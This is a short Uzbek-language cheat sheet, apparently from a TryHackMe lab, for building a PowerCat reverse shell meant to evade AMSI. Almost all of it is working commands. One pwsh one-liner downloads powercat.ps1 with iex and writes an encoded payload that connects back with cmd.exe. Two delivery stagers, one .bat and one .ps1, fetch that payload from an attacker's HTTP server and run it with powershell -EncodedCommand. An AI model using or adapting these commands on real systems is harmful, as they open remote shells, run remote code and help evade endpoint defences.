# Reverse shell uchun AMSI bypass ps1 tayyorlash
(PowerCatdan foydalanish)
```
LHOST=10.8.211.1
```
```                                                                     
LPORT=49731
```
```                                                                
rshell=shell-49731.txt
```                                                                     
```
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /home/0xb0b/Documents/tryhackme/avenger/$rshell
```
## Yetkazish:
.bat:
```
START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.8.211.1:9000/shell-49731.txt');iex 'powershell -E $code'
```
.ps1
```
$code = (New-Object System.Net.WebClient).DownloadString('http://192.168.190.26:9000/shell-49731.txt')
Invoke-Expression "powershell -EncodedCommand $code"
```
